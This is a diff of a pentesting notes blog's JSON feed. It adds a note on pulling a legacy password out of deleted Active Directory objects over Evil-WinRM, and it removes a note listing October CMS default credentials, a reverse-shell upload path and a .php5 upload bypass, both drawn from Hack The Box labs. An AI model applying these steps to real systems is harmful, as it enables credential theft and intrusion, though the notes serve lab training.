@@ -17,6 +17,30 @@
 "items": [
     
         {
+            "id": "https://mvineza.github.io/spindel/2022/04/30/ad-recycle-bin",
+            "title": "AD Recycle Bin",
+            "summary": "AD Recycle Bin",
+            "content_text": "OverviewAttacker can retrieve juicy information from deleted AD Objects if he had gained access to a low-privileged user that has access in deleted AD objects.Environment Setup and Requirements  Low privileged user that can access deleted AD objectsSteps  Check current permission*Evil-WinRM* PS C:\\users\\arksvc&gt; whoami /all | findstr /i recycleCASCADE\\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group*Evil-WinRM* PS C:\\users\\arksvc&gt;   Check if you can see deleted objectsGet-ADObject -filter 'isDeleted -eq $true -and name -ne \"Deleted Objects\"' -includeDeletedObjects  Find juicy information45689883479503*Evil-WinRM* PS C:\\users&gt; Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties * | findstr cascadeLegacyPwdcascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz*Evil-WinRM* PS C:\\users&gt; References  HTB Cascade                              [Active Directory Recycle Bin          Recover Deleted AD Object          AD Deleted Objects](https://stealthbits.com/blog/active-directory-object-recovery-recycle-bin/)                      ACTIVE DIRECTORY OBJECT RECOVERY (RECYCLE BIN)",
+            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can retrieve juicy information from deleted AD Objects if he had gained access to a low-privileged user that has access in deleted AD objects.</p><h2 id=\"environment-setup-and-requirements\">Environment Setup and Requirements</h2><ul>  <li>Low privileged user that can access deleted AD objects</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Check current permission</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">*</span><span class=\"n\">Evil-WinRM</span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nx\">PS</span><span class=\"w\"> </span><span class=\"nx\">C:\\users\\arksvc</span><span class=\"err\">&gt;</span><span class=\"w\"> </span><span class=\"nx\">whoami</span><span class=\"w\"> </span><span class=\"nx\">/all</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"w\"> </span><span class=\"n\">findstr</span><span class=\"w\"> </span><span class=\"nx\">/i</span><span class=\"w\"> </span><span class=\"nx\">recycle</span><span class=\"w\"></span><span class=\"n\">CASCADE\\AD</span><span class=\"w\"> </span><span class=\"nx\">Recycle</span><span class=\"w\"> </span><span class=\"nx\">Bin</span><span class=\"w\">                      </span><span class=\"nx\">Alias</span><span class=\"w\">            </span><span class=\"nx\">S-1-5-21-3332504370-1206983947-1165150453-1119</span><span class=\"w\"> </span><span class=\"nx\">Mandatory</span><span class=\"w\"> </span><span class=\"nx\">group</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"nx\">Enabled</span><span class=\"w\"> </span><span class=\"nx\">by</span><span class=\"w\"> </span><span class=\"nx\">default</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"nx\">Enabled</span><span class=\"w\"> </span><span class=\"nx\">group</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"nx\">Local</span><span class=\"w\"> </span><span class=\"nx\">Group</span><span class=\"w\"></span><span class=\"o\">*</span><span class=\"n\">Evil-WinRM</span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nx\">PS</span><span class=\"w\"> </span><span class=\"nx\">C:\\users\\arksvc</span><span class=\"err\">&gt;</span><span class=\"w\"> </span></code></pre></div></div><ul>  <li>Check if you can see deleted objects</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">Get-ADObject</span><span class=\"w\"> </span><span class=\"nt\">-filter</span><span class=\"w\"> </span><span class=\"s1\">'isDeleted -eq $true -and name -ne \"Deleted Objects\"'</span><span class=\"w\"> </span><span class=\"nt\">-includeDeletedObjects</span><span class=\"w\"></span></code></pre></div></div><ul>  <li>Find juicy information</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"mi\">45689883479503</span><span class=\"w\"></span><span class=\"o\">*</span><span class=\"n\">Evil-WinRM</span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nx\">PS</span><span class=\"w\"> </span><span class=\"nx\">C:\\users</span><span class=\"err\">&gt;</span><span class=\"w\"> </span><span class=\"nx\">Get-ADObject</span><span class=\"w\"> </span><span class=\"nt\">-filter</span><span class=\"w\"> </span><span class=\"s1\">'isDeleted -eq $true'</span><span class=\"w\"> </span><span class=\"nt\">-includeDeletedObjects</span><span class=\"w\"> </span><span class=\"nt\">-Properties</span><span class=\"w\"> </span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"w\"> </span><span class=\"n\">findstr</span><span class=\"w\"> </span><span class=\"nx\">cascadeLegacyPwd</span><span class=\"w\"></span><span class=\"n\">cascadeLegacyPwd</span><span class=\"w\">                </span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"nx\">YmFDVDNyMWFOMDBkbGVz</span><span class=\"w\"></span><span class=\"o\">*</span><span class=\"n\">Evil-WinRM</span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nx\">PS</span><span class=\"w\"> </span><span class=\"nx\">C:\\users</span><span class=\"err\">&gt;</span><span class=\"w\"> </span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>HTB Cascade</li>  <li>    <table>      <tbody>        <tr>          <td>[Active Directory Recycle Bin</td>          <td>Recover Deleted AD Object</td>          <td>AD Deleted Objects](https://stealthbits.com/blog/active-directory-object-recovery-recycle-bin/)</td>        </tr>      </tbody>    </table>  </li>  <li><a href=\"https://stealthbits.com/blog/active-directory-object-recovery-recycle-bin/\">ACTIVE DIRECTORY OBJECT RECOVERY (RECYCLE BIN)</a></li></ul>",
+            "url": "https://mvineza.github.io/spindel/2022/04/30/ad-recycle-bin",
+            
+            
+            
+            "tags": ["windows","ad","pivot","privesc"],
+            
+            "date_published": "2022-04-30T00:00:00+08:00",
+            "date_modified": "2022-04-30T00:00:00+08:00",
+            
+                "author":  {
+                "name": "spindel",
+                "url": null,
+                "avatar": null
+                }
+                
+            
+        },
+    
+        {
             "id": "https://mvineza.github.io/spindel/2022/04/28/nfs-hidden-mount",
             "title": "NFS hidden mount",
             "summary": "NFS hidden mount",
@@ -846,30 +870,6 @@
             
             "date_published": "2022-02-22T00:00:00+08:00",
             "date_modified": "2022-02-22T00:00:00+08:00",
-            
-                "author":  {
-                "name": "spindel",
-                "url": null,
-                "avatar": null
-                }
-                
-            
-        },
-    
-        {
-            "id": "https://mvineza.github.io/spindel/2022/02/19/october-cms",
-            "title": "October CMS",
-            "summary": "October CMS",
-            "content_text": "Credentials# defaultadmin:admin# othersoctober:passwdVersion Detection  Doesn’t discloseInteresting URL Paths# admin portal/backend/backend/auth/signin# media uploads directory - you can put reverse shell here/storage/app/media/Interesting Files and Directories# credentialsconfig/database.phpCredentials  You can register user without email verificationPlugins# account managementRainLab.UserSome Exploits and Vulnerabilities  File upload - bypass by using .php5 extensionReferences  HTB October",
-            "content_html": "<h2 id=\"credentials\">Credentials</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># default</span>admin:admin<span class=\"c\"># others</span>october:passwd</code></pre></div></div><h2 id=\"version-detection\">Version Detection</h2><ul>  <li>Doesn’t disclose</li></ul><h2 id=\"interesting-url-paths\">Interesting URL Paths</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># admin portal</span>/backend/backend/auth/signin<span class=\"c\"># media uploads directory - you can put reverse shell here</span>/storage/app/media/</code></pre></div></div><h2 id=\"interesting-files-and-directories\">Interesting Files and Directories</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># credentials</span>config/database.php</code></pre></div></div><h2 id=\"credentials-1\">Credentials</h2><ul>  <li>You can register user without email verification</li></ul><h2 id=\"plugins\">Plugins</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># account management</span>RainLab.User</code></pre></div></div><h2 id=\"some-exploits-and-vulnerabilities\">Some Exploits and Vulnerabilities</h2><ul>  <li>File upload - bypass by using <code class=\"language-plaintext highlighter-rouge\">.php5</code> extension</li></ul><h2 id=\"references\">References</h2><ul>  <li>HTB October</li></ul>",
-            "url": "https://mvineza.github.io/spindel/2022/02/19/october-cms",
-            
-            
-            
-            "tags": ["php","enum","cms"],
-            
-            "date_published": "2022-02-19T00:00:00+08:00",
-            "date_modified": "2022-02-19T00:00:00+08:00",
             
                 "author":  {
                 "name": "spindel",
